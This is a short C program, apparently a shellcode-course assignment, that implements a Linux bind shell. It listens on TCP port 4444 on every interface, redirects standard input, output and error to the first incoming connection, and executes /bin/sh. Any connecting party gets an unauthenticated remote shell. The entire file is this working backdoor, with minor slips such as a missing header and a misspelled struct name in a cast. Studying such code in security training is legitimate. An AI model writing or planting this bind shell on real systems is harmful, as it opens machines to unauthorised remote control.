// SLAE - Assignment #1: Shell Bind TCP (Linux/x86)
// Author:  Lennon Chia
 
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{

	int port = 4444;
	int i = 0;

	//Create a listening socket for the application
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);

	//Create and populate server side information
	struct sockaddr_in server_address;

	//Setting the socket address
	server_address.sin_family = AF_INET; //Define it as IPv4
	server_address.sin_addr.s_addr = INADDR_ANY; //	Define any interface 
 	server_address.sin_port = htons(port);  // Setting the port number


 	memset(&(server_address.sin_zero),'\0',8); // Zero the rest of the struct

 	//Binding the application
 	bind(listen_socket, (struct sockaddress *)&server_address, sizeof(server_address));

 	//Start listening for socket
 	listen(listen_socket, 0);

 	// Accept incoming connection and create socket for it 
    	int conn_sock = accept(listen_socket, NULL, NULL);

    	//dup2 loop 
    	for(i = 0; i <= 2; i++)
		dup2(conn_sock, i);

	//Execute the program by filename
	execve("/bin/sh", NULL, NULL);


}
